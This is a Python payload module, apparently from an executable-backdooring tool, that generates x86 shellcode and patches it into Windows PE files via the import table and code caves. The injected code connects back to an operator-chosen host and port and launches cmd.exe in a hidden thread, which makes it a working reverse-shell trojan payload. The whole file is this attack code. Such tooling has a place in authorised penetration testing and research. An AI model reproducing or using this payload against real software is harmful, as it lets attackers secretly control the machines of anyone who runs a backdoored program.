import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)


class iat_reverse_tcp_inline_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_reverse_tcp_inline_threaded"
        self.description = """Import Address Table reverse tcp shell threaded"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = b"\x90\x90\x60\x9c"
        self.stackrestore = b"\x9d\x61"
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                                 b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'single'

    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Position dependent shellcode that uses API thunks of LoadLibraryA and
        GetProcAddress to find and load APIs for callback to C2.
        """
        
        #sanity check
        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                print("APIs not found")
                return False
        
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode2 = b"\xe8"
            #if self.PM.BDF.pe_object['XP_MODE'] is True:
            #    xp_offset = 0
            #else:
            xp_offset = 11
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
        else:
            self.shellcode2 = b"\xE8\xE5\xFF\xFF\xFF"

        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 58

        self.shellcode2 += bytes("\xFC"
                            "\x60"                          # pushal
                            "\x89\xe5"                      # mov ebp, esp
                            "\x31\xd2"                      # xor edx, edx
                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                            # entry point is now in edx
                            , 'iso-8859-1')
        self.shellcode2 += b"\xbb"           # mov value below to EBX
        if self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']))

        self.shellcode2 += b"\x01\xD3"   # add EBX + EDX
        self.shellcode2 += b"\xb9"       # mov value below to ECX

        if self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']))
        self.shellcode2 += b"\x01\xD1"   # add ECX + EDX

        self.shellcode2 += bytes("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68"
                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
                            "\x95\x6A\x05\x68"
                            , 'iso-8859-1')
        self.shellcode2 += common.pack_ip_addresses(self.HOST)          # HOST
        self.shellcode2 += b"\x68\x02\x00"
        self.shellcode2 += struct.pack('!H', int(self.PORT))      # PORT
        self.shellcode2 += bytes("\x89\xE2\x6A"
                            "\x10\x52\x51\x87\xF9\xFF\xD5"
                            , 'iso-8859-1')

        self.shellcode2 += bytes("\x85\xC0\x74\x00\x6A\x00\x68\x65\x6C"
                            "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
                            "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
                            "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
                            "\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01"
                            "\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56"
                            "\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32"
                            "\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F"
                            "\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69"
                            "\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46"  # \x89\xD4"
                            "\xFF\x32\x96\xFF\xD5"  # \x81\xC4\x34\x02\x00\x00"
                            , 'iso-8859-1')

        # ExitFunc
        # Just try exitthread...
        self.shellcode2 += bytes("\x68\x6f\x6e\x00\x00"
                            "\x68\x65\x72\x73\x69"
                            "\x68\x47\x65\x74\x56"  # GetVersion
                            "\x54"                  # push esp
                            "\x56"                  # push esi
                            "\xff\x17"              # call dword ptr ds: [edi] ; getprocaddress
                            "\xff\xd0"              # call eax ; getversion
                            "\x3c\x06"              # cmp al, 6
                            "\x7D\x13"              # jl short
                            "\x68\x61\x64\x00\x00"  # ...
                            "\x68\x54\x68\x72\x65"  # ...
                            "\x68\x45\x78\x69\x74"  # ExitThread
                            "\x54"                  # push esp
                            "\x56"                  # push ebp (kernel32)
                            "\xeb\x28"              # jmp short to push getprocaddress
                            "\x68\x6c\x00\x00\x00"              # ...
                            "\x68\x6e\x74\x64\x6c"  # ntdll
                            "\x54"                  # push esp
                            "\xff\x13"              # call dword ptr ds:[ebx] loadliba
                            "\x68\x64\x00\x00\x00"              # ...
                            "\x68\x68\x72\x65\x61"  # ...
                            "\x68\x73\x65\x72\x54"  # ...
                            "\x68\x78\x69\x74\x55"  # ...
                            "\x68\x52\x74\x6c\x45"  # RtlExitUserThread
                            "\x54"                  # push esp
                            "\x50"                  # push eax
                            "\xff\x17"              # call getprocaddress
                            "\x6a\x00"              # push 0
                            "\xff\xd0"              # call eax
                            , 'iso-8859-1')

        
        #starts the VirtualAlloc/CreateThread section for the PAYLOAD
        self.shellcode1 = b"\xFC"  # Cld
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            self.shellcode1 += bytes("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                , 'iso-8859-1')
        '''
        self.shellcode1 += b"\xbb"           # mov value below to EBX
        #Put VirtualAlloc in EBX
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            if self.PM.BDF.pe_object['VirtualAlloc'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + self.PM.BDF.pe_object['VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'] + 1)
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'])
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if self.PM.BDF.pe_object['CreateThread'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object['CreateThread'] - self.PM.BDF.pe_object['ImageBase']) + 1)
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['CreateThread'] - self.PM.BDF.pe_object['ImageBase'])
        else:
            '''
        if self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        self.shellcode1 += b"\x01\xD3"  # add EBX + EDX
        #Put Create Thread in ECX
        self.shellcode1 += b"\xb9"  # mov value below to ECX
        if self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))

        #Add in memory base
        self.shellcode1 += b"\x01\xD1"  # add ECX + EDX
        self.shellcode1 += b"\x8B\xE9"  # mov EDI, ECX for save keeping

        self.shellcode1 += b"\xBE"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)

        self.shellcode1 += bytes("\x00\x00"
                            "\x6A\x40"
                            "\x68\x00\x10\x00\x00"
                            "\x56"
                            "\x6A\x00", 'iso-8859-1')
        self.shellcode1 += b"\xff\x13"                      # call dword ptr [ebx]
        self.shellcode1 += bytes("\x89\xC3"
                            "\x89\xC7"
                            "\x89\xF1"
                            , 'iso-8859-1')

        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x16"  # <--length of shellcode below

        self.shellcode1 += b"\x5e"
        self.shellcode1 += bytes("\xF2\xA4"
                            "\x31\xC0"
                            "\x50"
                            "\x50"
                            "\x50"
                            "\x53"
                            "\x50"
                            "\x50"
                            , 'iso-8859-1')

        self.shellcode1 += b"\x3E\xFF\x55\x00"      # Call DWORD PTR DS: [EBP]
        self.shellcode1 += bytes("\x58"
                            "\x61"                  # POP AD
                            , 'iso-8859-1')

        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)
        
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
